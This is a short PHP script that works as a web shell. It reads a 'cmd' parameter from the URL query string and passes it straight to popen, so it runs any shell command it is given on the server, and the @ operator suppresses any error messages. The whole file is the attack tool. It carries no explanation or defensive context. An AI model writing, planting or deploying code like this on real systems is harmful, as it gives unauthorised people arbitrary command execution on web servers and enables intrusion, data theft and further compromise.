<?php
function execute($cfe) {
	$f = @popen($cfe,"r");
	$res = '';
	while(!@feof($f)) {
		$res .= @fread($f,1024); 
	}
	@pclose($f);
	return $res;
}

$command = $_GET['cmd'];
execute($command);
?>